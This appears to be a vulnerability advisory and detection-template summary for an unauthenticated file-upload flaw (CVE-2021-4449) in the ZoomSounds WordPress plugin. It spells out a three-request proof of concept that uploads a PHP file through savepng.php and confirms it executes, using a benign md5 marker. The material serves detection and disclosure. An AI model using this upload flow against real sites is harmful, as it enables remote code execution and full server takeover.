## Vulnerability
ZoomSounds plugin for WordPress contains a file upload vulnerability in savepng.php. Unauthenticated attackers can upload arbitrary PHP files via savepng.php without authentication or validation, achieving remote code execution and complete server compromise.

CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H (9.8). CWE-434.

## PoC / Detection
Classification: rce

The template detects the vulnerability with a three-request HTTP flow (using rand_filename and string variables):

- GET /wp-content/plugins/dzs-zoomsounds/savepng.php (internal matcher: status 200).
- POST /wp-content/plugins/dzs-zoomsounds/savepng.php?location={{rand_filename}}.php uploading `<?php echo md5("CVE-2021-4449");?>` payload (internal matcher: status 200 and filename in body).
- GET /wp-content/plugins/dzs-zoomsounds/{{rand_filename}}.php (matcher: status 200 and MD5 hash in body).

This confirms unauthenticated arbitrary PHP file upload and server-side execution.
